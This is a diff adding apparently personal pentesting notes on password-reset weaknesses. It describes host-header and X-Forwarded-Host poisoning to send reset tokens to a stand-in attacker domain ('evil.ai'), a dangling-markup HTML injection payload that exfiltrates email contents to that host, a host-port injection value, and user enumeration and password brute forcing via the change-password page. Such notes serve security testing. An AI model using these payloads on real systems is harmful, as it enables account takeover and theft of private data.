@@ -8,4 +8,29 @@ reset password url token should be strong and random with reference to the respe
 
 same token shouldlnt let reset other users password
 
+dynamically generated reset links based on the host feild in the request can be captured and pointed to attacker server by manipulation the host header or by placing x-forwarded-host header to make the bankend send the link with attacker server as the host and rest token 
+
+change host to : http://evil.ai
+the link will be generated as http://evil.ai/password?token=123
+
+thus now if the user clicks the link, the link will be captured in the attacker's log, thus token is stolen
+now the attacker can make a legit password reset request with that token.
+
+if html could be injected via host or any other, we can user dangling pointer techique to get data out of the mail
+
+"><img src='http://evil.ai?=
+as the url is left dangling everthing after the will be sent with url, thus lets us steal valuable information.
+
+look if the host accepts port as alpha numeric that can used as injection point 
+
+Host : ligit.server:'evil-payload
+
+changing user passwords
+
+change password page can be used to enumurate users and also brute force valid passwords based on responses
+
+
+
+
+
 
